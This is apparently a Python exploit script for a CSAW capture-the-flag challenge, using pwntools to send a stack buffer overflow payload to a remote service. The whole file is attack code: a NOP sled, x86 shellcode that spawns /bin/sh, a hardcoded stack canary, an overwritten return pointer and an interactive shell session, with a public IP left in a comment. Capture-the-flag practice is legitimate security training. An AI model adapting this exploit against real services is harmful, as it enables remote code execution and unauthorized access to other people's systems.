#!/usr/bin/env python
"""
Author: William Showalter
CSAW Team: MSU-CTF
"""
import struct
from pwn import *

#server_address = '54.173.98.115
#port = 1259
server_address = 'localhost'
port = 1259

BUFFER_SIZE = 128
CANARY_TO_RPTR = 12
SHELL_CODE = "\x31\xc0\xb0\x30" +\
            "\x01\xc4\x30\xc0" +\
            "\x50\x68\x2f\x2f" +\
            "\x73\x68\x68\x2f" +\
            "\x62\x69\x6e\x89" +\
            "\xe3\x89\xc1\xb0" +\
            "\xb0\xc0\xe8\x04" +\
            "\xcd\x80\xc0\xe8" +\
            "\x03\xcd\x80"

def makeShellWord(number):
	return struct.pack('<I',number)

def makePayloadString(offset):
	offset = int(offset,16)
	shell_ptr = makeShellWord(offset)

	sled = "\x90"*CANARY_TO_RPTR # second use of sled needs specific size

	remaining_buff = "\x90"*(BUFFER_SIZE-len(SHELL_CODE)-len(sled))
	canary = makeShellWord(0x475a31a5)+makeShellWord(0x40501555)

	payload_str = sled + SHELL_CODE + remaining_buff + \
		canary + sled + shell_ptr
	
	return payload_str

if __name__ == "__main__":
	sock = remote(server_address, port, timeout=None)
	data = sock.recv(16)
	print data[6::]
	
	payload = makePayloadString(data[6::])
	sock.sendline(payload)
	sock.interactive()